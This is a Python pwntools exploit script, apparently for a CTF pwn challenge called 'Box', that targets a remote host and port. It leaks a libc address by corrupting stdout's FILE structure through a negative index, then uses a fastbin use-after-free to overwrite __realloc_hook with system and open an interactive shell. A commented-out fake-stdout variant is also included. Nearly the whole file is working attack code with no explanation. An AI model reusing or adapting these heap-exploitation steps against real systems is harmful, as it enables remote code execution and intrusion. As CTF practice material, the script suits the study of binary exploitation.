#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './Box'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
#libc = context.binary.libc
if args['REMOTE']:
	p = remote('101.71.29.5', 10035)
	libc = ELF('./x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./Box')

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('Your Choice: ', str(ch))

def add(idx, size):
	menu(1)
	p.sendlineafter('ID: ', str(idx))
	p.sendlineafter('Size: ',str(size))
	print "add  chunk %d success" % idx

def edit(idx, content):
	menu(2)
	p.sendlineafter('ID: ', str(idx))
	p.sendafter('Content: ',content)

	print "edit %d chunk success" % idx

def free(idx):
	menu(3)
	p.sendlineafter('ID: ', str(idx))
	print "free chunk %d success " % idx

def exploit():

	add(0, 0x10)
	edit(0, '/bin/sh\x00')
	#gdb.attach(p, 'b puts')
	#dbg()
	#add(1, 0x20)

	#leak address stdout
	edit(-12, p64(0xfbad1800) + p64(0)*3 + '\x00')
  	data = p.recv(0x20)
  	leak = u64(data[0x18:])                                 #io_file jump
  	print "leak ==> " + hex(leak)
  	libc_base = leak - libc.symbols['_IO_file_jumps']
  	libc.address = libc_base
  	free_hook = libc.symbols['__free_hook']
  	malloc_hook = libc.symbols['__malloc_hook']
  	realloc_hook = libc.symbols['__realloc_hook']

  	one_gadget = 0x45216 + libc_base
  	system = libc.symbols['system']
  	print "libc.address ==> " + hex(libc_base)
  	print "__free_hook ==> " + hex(free_hook)
  	print "__malloc_hook ==> " + hex(malloc_hook)
  	print "__realloc_hook ==> " + hex(realloc_hook)

  	dbg()
  	stdout = libc.symbols['_IO_2_1_stdout_']
  	stdin = libc.symbols['_IO_2_1_stdin_']
  	stderr = libc.symbols['_IO_2_1_stderr_']
  	print "stdin ==> " + hex(stdin)

  	#fastbin attack, uaf
  	add(2, 0x58)
  	add(3, 0x68)
  	free(3)
  	add(3, 0x68)
  	edit(3, p64(realloc_hook-0xb-0x10))
  	add(1, 0x68)
  	add(2, 0x68)		#realloc
  	edit(2, 'a'*0xb+ p64(system))
  	add(0, 0x68)

  	'''
  	fake_stdout = p64(0xfbad2887)
  	fake_stdout += p64(stdout+131)*7
  	fake_stdout += p64(stdout+132)
  	fake_stdout += p64(0)*4
  	fake_stdout += 	p64(stdin)
  	fake_stdout += p64(1)
  	fake_stdout += p64(0xffffffffffffffff)
  	fake_stdout += p64(0x000000000a000000)
  	fake_stdout += p64(stdout+0x1160)
  	fake_stdout += p64(0xffffffffffffffff)
  	fake_stdout += p64(0)
  	fake_stdout += p64(stdout - 0xe80)
  	fake_stdout += p64(0)*3
  	fake_stdout += p64(0xffffffffffffffff)
  	fake_stdout += p64(0)*2
  	fake_stdout += p64(stdout-0x1f40)

	offset = free_hook - stdout
  	payload = fake_stdout
  	payload += p64(stderr) + p64(stdout)
  	payload += p64(stdin) + p64(stdout-0x3a4ab0)
  	payload = payload.ljust(offset, '\x00')
  	edit(-12, payload + p64(system))

  #	free(0)
  	
  	#check
	edit(-12, p64(0xfbad1800) + p64(0) + p64(free_hook) + p64(0) + p64(free_hook) + p64(free_hook+8))
  	data = p.recv(8)
  	leak = u64(data)                                 #io_file jump
  	print "leak ==> " + hex(leak) 
	'''

  	p.interactive()
  	p.close()


if __name__ == '__main__':
	exploit()